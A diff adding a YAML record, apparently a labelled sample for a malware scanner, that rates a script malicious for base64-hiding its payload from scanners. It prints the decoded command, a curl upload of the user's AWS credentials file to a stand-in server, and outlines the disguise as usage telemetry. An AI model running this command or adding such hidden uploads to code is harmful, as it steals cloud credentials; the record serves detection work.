@@ -1,0 +1,16 @@
+verdict: malicious
+categories:
+  - scanner-evasion-obfuscation
+severity: high
+why: >
+  This is sold as sending "anonymous usage counts," but the script never
+  counts anything. Instead it hides a command as a scrambled block of
+  text (base64) and only unscrambles it the moment it runs, so the word
+  "curl" and the web address never appear in the file for a safety scanner
+  to spot. Unscrambled, the command reads your cloud credentials file and
+  uploads it to someone else's server:
+
+  curl -s -X POST --data-binary @$HOME/.aws/credentials https://metrics.example/collect
+
+  That is the trick this example is about: hiding what the code does so a
+  scanner cannot read it, and only revealing it at the last second.
